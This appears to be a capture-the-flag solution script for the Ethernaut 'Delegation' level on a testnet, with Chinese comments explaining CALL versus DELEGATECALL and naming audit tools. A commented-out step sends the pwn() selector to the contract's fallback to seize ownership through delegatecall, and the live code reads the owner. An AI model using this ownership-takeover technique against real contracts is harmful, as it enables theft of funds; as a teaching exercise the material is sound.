# 07-Delegation
```
async function main() {
    const client = createPublicClient({
        chain: sepolia,
        transport: http(RPC_URL),
    });
    
    const account = privateKeyToAccount(PRIVATE_KEY);   

    const walletClient = createWalletClient({
        account,
        chain: sepolia,
        transport: http(RPC_URL),
    });

    // // 计算 pwn() 的函数选择器: keccak256("pwn()") 的前4字节
    // const data = keccak256(toHex('pwn()')).slice(0, 10); // 0xdd365b8b

    // console.log('Function selector:', data);

    // // 直接发送交易触发 Delegation 的 fallback 函数
    // const tx = await walletClient.sendTransaction({
    //     to: CONTRACT_ADDRESS,
    //     data: data
    // });
    // console.log('Transaction hash:', tx);
    
    // const receipt = await client.waitForTransactionReceipt({ hash: tx });
    // console.log('Transaction was mined in block', receipt.blockNumber);
    // console.log('Transaction status:', receipt.status === 'success' ? '✓ Success' : '✗ Failed');

    //check owner
    const ownerData = keccak256(toHex('owner()')).slice(0, 10);
    const result = await client.call({
        to: CONTRACT_ADDRESS,
        data: ownerData
    });
    // client.call() 返回 { data: '0x...' }，取出 data 字段
    const ownerAddress = '0x' + result.data.slice(-40); // 截取最后20字节(40个十六进制字符)
    console.log('Current owner address:', ownerAddress);
       
}

main().catch((error) => {console.log(error);process.exit(1);});
/*
 * 
  EVM 层面的根本区别

  1. CALL vs DELEGATECALL 操作码

  在 EVM 中，这是两个不同的操作码：

  - CALL (0xF1)：
    - 创建新的执行环境
    - msg.sender = 调用者合约地址
    - msg.value = 转账金额
    - 修改目标合约的 storage
    - 独立的执行上下文
  - DELEGATECALL (0xF4)：
    - 借用目标合约的代码，在当前合约的上下文中执行
    - msg.sender = 保持原始调用者
    - msg.value = 保持原始 value
    - 修改调用者合约的 storage
    - 共享执行上下文
    
4. 审计工具
  - Slither 能检测 delegatecall 到用户控制的地址
  - Mythril 能检测 storage collision
  - Certora 能形式化验证升级安全性
 */

```